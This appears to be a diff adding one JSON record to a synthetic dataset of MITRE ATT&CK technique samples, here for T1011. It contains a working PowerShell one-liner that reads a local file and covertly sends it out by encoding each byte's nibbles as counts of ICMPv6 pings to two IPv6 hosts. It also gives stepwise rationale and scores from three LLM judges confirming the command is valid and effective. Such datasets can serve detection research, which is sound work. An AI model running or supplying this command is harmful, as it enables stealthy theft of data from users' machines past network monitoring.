@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d1='fd00:3333::a'; $d2='fd00:3333::b'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ $hi=($b -shr 4); $lo=($b -band 0x0F); Test-Connection -ComputerName $d1 -Count (2 + $hi) -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds 150; Test-Connection -ComputerName $d2 -Count (2 + $lo) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Encodes nibbles into the number of ICMPv6 echos (-Count) sent to two destinations, a covert channel over ICMPv6 under T1011.",
+  "rationale_steps": [
+    "Derive high/low nibbles from each byte.",
+    "Transmit small bursts where the burst length encodes the nibble.",
+    "Space bursts with a short sleep to delineate values for the receiver."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-a32fe73c",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid bitwise ops, and correct Test-Connection/-IPv6/-Count usage.",
+        "semantic_score": 5,
+        "semantic_justification": "It reads a file and automates exfiltration by encoding each byte’s nibbles into the number of ICMPv6 echo requests to two hosts, forming a plausible covert channel.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:36:14.851557Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignments, valid method calls, and correct loop structure.",
+        "semantic_score": 5,
+        "semantic_justification": "The command implements a covert exfiltration channel by encoding file bytes into ICMPv6 echo request counts sent to two IPv6 addresses, perfectly aligning with the T1011 technique of automated exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:36:17.622840Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, valid cmdlet usage, and proper variable and method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves its claimed intent by encoding file data into ICMPv6 ping counts for automated exfiltration over a covert channel, which directly aligns with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T05:47:36.030885Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
